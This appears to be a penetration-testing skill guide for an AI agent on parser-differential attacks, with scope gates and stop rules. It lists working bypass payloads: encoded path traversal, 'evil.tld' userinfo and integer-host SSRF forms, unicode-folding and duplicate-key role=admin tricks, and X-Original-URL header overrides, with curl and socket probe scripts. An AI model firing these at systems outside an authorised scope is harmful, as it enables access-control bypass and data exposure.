---
name: zp-semantic-confusion
description: ZeroProtocol hunter for semantic confusion and parser differentials - two components assigning different meaning to one attacker-controlled value. Use when a proxy, WAF, router and framework all read the same URL, header, JSON or multipart field, when a validator normalises differently from its sink, when duplicate parameters or unicode folding are in play, or when an internal redirect re-parses a request. A finding needs the disagreement plus a security decision taken between the two readings.
---

# zp-semantic-confusion - same bytes, two meanings

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Every other skill here asks *was the input validated*. This one asks: **did the component that
made the security decision and the component that acted on the value agree about what the value
meant?** A finding is never "the parser is lenient" - it is a pair of requests differing on one
representation axis, where one reading passed a check and the other reached a sink.

---

## Procedure

**1. Name the invariant before you touch the target.** *All components must agree on the ____ of
this value* - origin, path segment, filename, content type, identity, or which occurrence wins.
Without a named invariant you cannot separate a differential from a curiosity.

**2. Enumerate the consumers.** You need at least two, with a decision between them.

```bash
curl -skI "https://$H/" | grep -iE '^(server|via|x-cache|cf-ray|x-powered-by|x-served-by|x-envoy)'
for v in --http1.1 --http2; do curl -skI "https://$H/" $v | grep -i '^server'; done  # 2 = 2 stacks
```

Two distinct `Server` values, a `Via` or an `X-Cache` mean the request is parsed at least twice.
A single-hop app with no proxy rarely hosts this class - spend the time elsewhere.

**3. Baseline a route that must deny you and one that allows you** - a known 401/403 and a known
200, both on *your own* account. Without the denial there is no invariant to break.

**4. Change one axis at a time and diff four things** - status, length, body digest, and any
header naming a handler. Two axes at once and the disagreement is no longer attributable.

```bash
probe() {  # $1 = path, sent byte-for-byte
  printf '%-34s ' "$1"
  curl -sk --path-as-is -o /tmp/zp.b -w '%{http_code} %{size_download} %{redirect_url} ' "https://$H$1"
  md5sum < /tmp/zp.b
}
for v in "/admin" "/Admin" "/%61dmin" "/%2561dmin" "/admin/" "/admin;x=1" "//admin" "/./admin" \
         "/static/..%2fadmin" "/static/..%5cadmin" "/%2e%2e/admin" "/admin%00" "/admin%0a" \
         "/admin%09" "/admin.json"; do probe "$v"; done
```

`--path-as-is` is mandatory - without it curl collapses `..` and `//` itself and you have tested
your own client. Any status differing from baseline is a lead; **200 with protected content** is
the finding.

**5. Send exact bytes when a client would normalise them away.** Stdlib only, so it always runs.
The `openssl` equivalent is `printf 'GET /..%%2fadmin HTTP/1.1\r\nHost: %s\r\n\r\n' "$H" | openssl s_client -quiet -connect "$H:443" -servername "$H"`.

```bash
python3 -c 'import socket,ssl,sys; h=sys.argv[1]
c=ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
s=c.wrap_socket(socket.create_connection((h,443),10),server_hostname=h)
s.sendall(("GET /..%2fadmin HTTP/1.1\r\nHost: "+h+"\r\nConnection: close\r\n\r\n").encode())
print(s.recv(8192).decode("latin-1")[:500])' "$H"
```

Send only well-formed requests. Malformed framing, oversized bodies and delayed-body cases belong
to `zp-smuggling` under its own gate; crash and exhaustion testing is out of scope entirely.

**6. With source, test the validator and the sink separately** - the signature is a check on
value A followed by a sink on `transform(A)`.

```bash
grep -rnE 'startsWith|startswith|indexOf|\.includes\(|hasPrefix' . | head -40
grep -rnE 'unquote|urldecode|decodeURIComponent|normalize\(|NFKC|casefold|toLowerCase|realpath' . | head -40
```

A prefix allowlist plus a later decode is the highest-yield pair in the class. Two decodes
anywhere in the chain (`%2561dmin`) mean the check and the sink cannot be reading one string.

**7. Prove both readings, then stop.** The proof is the bytes sent, what the control saw, what the
sink acted on, the transformation that created the gap, and a paired negative control that fails.
Then **stop** - do not enumerate the surface you unlocked, invoke the handler, or read another
user's data. Name the capability and hand off.

---

## Probes and payloads

**Path and URL** - one axis each. Positive = status or body digest differs from baseline.

| Variant | Disagreement it isolates | Positive looks like |
|---|---|---|
| `/%2561dmin` | double decode between proxy and app | 403 at the edge, 200 at the app |
| `/static/..%2fadmin` | dot-segments removed after the cache key or ACL | 200 protected content, or a cache `HIT` |
| `/admin.json`, `/admin.css` | extension-keyed cache or suffix router | static-style caching of a private page |
| `/admin%00`, `/admin%0a` | truncation in one parser only | 200 where `/admin` was 403 |
| `/api/publicish` vs `/api/public/` | prefix allowlist with no segment awareness | the sibling route inherits the allow |
| `http://$H@evil.tld/`, `https://evil.tld\@$H/` | userinfo vs host split across two URL parsers | validator sees `$H`, fetcher sees `evil.tld` |
| `http://2130706433/`, `http://0x7f000001/` | integer or hex host forms only one parser resolves | allowlist bypass -> `zp-ssrf` |

**Unicode and case folding** - learn what the target does before choosing a payload.

```bash
python3 -c 'import unicodedata as u
for cp in (0x212A,0xFF07,0xFF0F,0x017F,0x0130,0x00AD):
 c=chr(cp); print(hex(cp), repr(u.normalize("NFKC",c)), repr(c.lower()), repr(c.upper()),
 "".join("%%%02X"%b for b in c.encode()))'
```

| Payload | Folds to | Where it pays |
|---|---|---|
| `%E2%84%AA` KELVIN SIGN | `K` under NFKC | echoed back as `K` = the app normalises after filtering |
| `%EF%BC%87` FULLWIDTH APOSTROPHE | `'` | a quote reaching a query builder past a character filter |
| `%EF%BC%8F` FULLWIDTH SOLIDUS, `%EF%BC%8E` FULLWIDTH STOP | `/` and `.` | delimiters and dot segments created after path validation |
| `%C5%BF` LATIN LONG S | uppercases to `S` | an uppercasing identity check matching `ADMIN` |
| `%C4%B0` DOTTED CAPITAL I | lowercases to `i` + a mark | identity collision; `%C2%AD` SOFT HYPHEN is stripped on some IDNA paths |

**Overloaded and duplicated fields** - the same key read twice, differently.

| Probe | What splits |
|---|---|
| `?id=1&id=2`, then `?id=2&id=1` | first-wins vs last-wins vs array, between WAF and app |
| `{"role":"user","role":"admin"}` | duplicate JSON keys - most parsers keep the last |
| `{"id":"1 "}`, `{"id":1}`, `{"id":[1]}` | type coercion between the validator and the query layer |
| a JSON key spelled with a unicode escape - `\u0072ole` for `role` | the sink parser resolves it, a string filter over the raw body misses it |
| `application/json; charset=utf-16` with a UTF-16 body | a WAF decoding UTF-8 sees noise, the framework sees the payload |
| two `Content-Disposition` parts both `name="role"` | multipart first-wins vs last-wins; same question for `X-Forwarded-For: 1.2.3.4, 127.0.0.1` |
| `filename="a.txt"; filename*=UTF-8''a.php` | RFC 5987 form read by the storer, plain form by the checker |

**Lifecycle and internal re-parse** - the same request read again in a second state.

```bash
for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-Uri: /admin"; do
  printf '%-18s ' "${h%%:*}"; curl -sk -o /dev/null -w '%{http_code}\n' "https://$H/" -H "$h"
done   # add "X-HTTP-Method-Override: PUT" on a POST route to test verb re-reads
```

A `200` on `/` carrying `X-Original-URL: /admin` means the edge keyed its ACL on the visible path
while the app re-routed on the header. Also compare a route reached directly against the same one
reached via an in-app redirect or subrequest - metadata surviving into phase two is this bug on a
different clock.

---

## Confirm or kill

Most of this class dies here, and it should.

| Observation | Verdict |
|---|---|
| a variant returns **200 with data the baseline 401/403 withheld** | **confirmed authorization bypass.** Severity from the data. High to Critical |
| the validator rejects reading A, the sink demonstrably acts on B, one security decision between | **confirmed semantic confusion.** Severity from the sink's authority |
| the cache key differs from the path the origin served | confirmed, but cache-shaped - prove it on a busted key via `zp-cache-poison` |
| the upload detector classified one type, the consumer executed another | confirmed -> `zp-upload` for the execution proof |
| the WAF sees value 1 and the app uses value 2, **and the app rejects the payload anyway** | **WAF bypass only. Not a vulnerability.** Informational at best. Killed |
| status differs (403 vs 404 vs 400), no protected resource reached, no sink acts | **killed.** A parser is lenient; nothing disagreed about meaning |
| the app echoes `K` for KELVIN SIGN but every filter runs post-normalisation | normalisation confirmed, exploitation not. File nothing |
| the difference is visible only in access logs | killed - unless the log *is* the control (rate limit, audit ACL) |
| the variant reaches a route returning the **same public content** as baseline | killed. No decision was crossed |
| behaviour read about in a CVE, deployed version untested | **killed until reproduced here.** Version-specific claimed as universal is the classic bogus report |

Severity comes from the **later** consumer, never from how exotic the payload was - a beautiful
double-decode into a public changelog is a Low, and usually a Won't Fix.

---

## High-value patterns

- **CDN or WAF in front of a framework with its own router** - two path parsers, one ACL. The most productive shape in this class.
- **A prefix allowlist (`startsWith("/public")`) guarding a route table** - test the sibling `/publicish` and the encoded separator.
- **A gateway authorising on the visible path while the app re-routes on `X-Original-URL`** - the whole admin surface, one header.
- **An SSRF allowlist comparing hostname strings before a fetcher re-parses the URL** - userinfo, backslash and integer-host forms.
- **Identity systems that case-fold or NFKC-normalise emails after the uniqueness check** - account collision, `zp-authz` impact.

---

## Pitfalls

- **Moving two axes at once.** The disagreement stops being attributable and the report stops being reproducible.
- **Forgetting `--path-as-is`.** curl collapses `..` and `//` before sending; you measured your own client.
- **Filing a WAF bypass as a vulnerability** when the application rejects the payload identically. The most common junk report in this class.
- **Malformed framing, oversized or delayed bodies at a live target.** A stability risk, not a probe - that is `zp-smuggling`'s gate, and crash testing is never in scope.
- **Pivoting after the primitive lands** - enumerating files, reading other tenants' records, invoking the handler you unlocked. Stop at the paired proof.
- **Testing origin IPs or alternate hosts found mid-run** without re-running `zp-scope check` on each one.

---

## Hand off to

Cache-key versus origin-path divergence -> `zp-cache-poison`. Framing or HTTP/2-downgrade ->
`zp-smuggling`. URL splits reaching a fetcher -> `zp-ssrf`; landing in file IO -> `zp-xxe-lfi`.
Detector/consumer mismatch on uploads -> `zp-upload`. Routes reached and identity collisions ->
`zp-authz`, `zp-idor`. Type coercion into a datastore, template or object graph -> `zp-sqli`,
`zp-rce-ssti`, `zp-proto-pollution`. Overloaded API or schema fields -> `zp-api`, `zp-graphql`.
Browser-side decode into a DOM sink -> `zp-xss`; origin-string comparison -> `zp-cors`. Token and
claim parsing -> `zp-jwt-oauth`. Order-dependent drift -> `zp-race`, `zp-business-logic`.
Validator/sink pairs in source -> `zp-code-audit`; raw capture and replay -> `zp-proxy`,
`zp-toolchain`. Confirmed -> `zp-triage`, then `zp-report` with both readings and the control.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `semantic_confusion`.
